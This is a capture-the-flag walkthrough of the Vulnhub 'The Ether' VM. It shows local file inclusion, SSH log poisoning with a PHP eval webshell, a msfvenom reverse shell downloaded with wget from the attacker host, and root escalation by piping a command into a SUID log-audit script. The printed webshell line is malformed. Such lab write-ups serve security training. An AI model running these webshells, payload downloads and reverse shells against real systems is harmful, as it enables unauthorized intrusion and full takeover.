---
title: Vulnhub-The-Ether
---

# Vulnhub-The_Ether

## Target VM Information
### Download Link
[http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip](http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip)

### Runtime Environment
This target VM provides a `VMware` image. Download it from the link above, extract it, and run the `vmx` file.

Target VM: can be set to NAT
Attacker machine: Kali 2021.1, windows 11

This target VM has some difficulty and is not suitable for beginners.

### Goal

get-flag

## Information Gathering

Target discovery and port/service identification:

```shell
# Determine the target IP
arp-scan -l
# Port scanning, service identification, and save scan results as txt
nmap -A -v 192.168.160.210 -oN the.txt
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(1).png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(2).png)

We can determine that `192.168.160.210` is the IP of the target VM.

Analyzing the `nmap` scan results shows that the target VM only has ports `22` and `80` open, and the system is `Ubuntu`. Port `22` is the `SSH` service, and port `80` is the `http` service. The web container is `Apache/2.4.18`.

## Vulnerability Discovery

### nikto Web Scan

```shell
nikto -h 192.168.160.210
```

The `images` directory and `/icons/README` file are found, but they do not provide useful exploitation value.

### Directory Scanning

```shell
dirb 192.168.160.210
```

Apart from some static files, no valuable exploitation points are found.

### Manual Probing

Browse the website's web service page and perform manual probing.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(3).png)

After clicking the `ABOUT US` link, the URL is found to be `http://192.168.160.210/?file=about.php`, which may indicate arbitrary file inclusion.

### File Inclusion Test

a. Try reading `../../../../../../../etc/passwd`, but it fails.

b. Try using the `php://filter` wrapper to read files and the `php://input` wrapper to write a webshell for connection.

c. Test several common Apache-related file paths:

```shell
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/logs/access.log
/var/log/access.log
/etc/apache2/apache2.conf
```

None return results.

The configuration file path may have been changed.

Combining this with the earlier reconnaissance results, the target VM only has `http` and `ssh` services enabled. Apache log inclusion failed.

d. Try including the SSH login log, and reading succeeds.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(4).png)

## Getshell

### Writing the Webshell

Use a one-line webshell as the username to log in to the target VM over SSH. The SSH log records this login behavior, allowing the one-line webshell to be written into the SSH log file.

```php
<?php eval($_GET[a];?)>
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(5).png)

Click OK, use any password, and then connect. Use Burp to test whether the write succeeded.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(6).png)

The write succeeds, and corresponding commands can be executed.

### msf Reverse Shell

Next, use `msf` to generate a Linux shell program and reverse a shell.

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.160.129 LPORT=4444 -f elf > shell.elf
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(9).png)

Set up the listener:

```shell
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.160.129
exploit
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(7).png)

First, use Python to build a simple web server:

```python
python -m SimpleHTTPServer 80
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(8).png)

Then use the one-line webshell obtained earlier to execute commands: download the generated webshell, add execute permission, and run it.

```shell
# The following commands URL-encode spaces, plus signs, and other symbols so they execute correctly
# Download the payload
/?file=/var/log/auth.log&a=system('wget+192.168.160.129/shell.elf')%3b
# The generated payload file has no execute permission, so after transferring it to the target VM, grant execute permission before running it
/?file=/var/log/auth.log&a=system('chmod+%2bx+shell.elf')%3b
# Execute
/?file=/var/log/auth.log&a=system('./shell.elf')%3b
```

The reverse shell succeeds.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(10).png)

## Privilege Escalation

### Overflow Privilege Escalation

Now we have obtained the target VM's Meterpreter shell. Take a quick look at the information.

The system is `Ubuntu 16.04 (Linux 4.10.0-40-generic)`. A privilege escalation exploit for Ubuntu 16.04 had recently been disclosed, so try it here.

Exploit URL: https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

Privilege escalation fails.

### Use msf for Privilege Escalation

```
use post/multi/recon/local_exploit_suggester
```

No exploitable privilege escalation vulnerabilities are found.

### SUID File Privilege Escalation

First enter an interactive shell: `python -c 'import pty;pty.spawn("/bin/bash")'`

A special file, `xxxlogauditorxxx.py`, is found in the web directory.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(11).png)

Check the permissions of the `.py` file. It has SUID permissions, and the file owner is root. It can be run with root privileges without a password. The `.py` file is misconfigured, allowing commands to be executed directly as root.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(12).png)

Run the `.py` file and find that it is a log auditing program.

When viewing logs, guess that this file runs the `cat` command. Add `| id` afterward to check whether command execution succeeds.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(13).png)

Execution succeeds.

Therefore, we can combine the Python script with the `/var/log/auth.log |` command to obtain root privileges.

Because the `msfvenom` payload was uploaded earlier, use it again here. Open another terminal and start an `msf` listener.

Use the discovered special script file to execute the previously uploaded `shell.elf` as root:

```shell
sudo ./xxxlogauditorxxx.py
/var/log/apache2/access.log|./shell.elf
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(14).png)

After running it, a root shell successfully reverses back, and privilege escalation succeeds.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(15).png)

Enter the `root` directory to view the flag. A `flag.png` file is found. View it:

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(18).png)

`cat flag.png`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(16).png)

A Base64 string is found. Decode it to obtain the flag.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/The%20Ether%20(17).png)

At this point, full penetration of the target VM is complete.
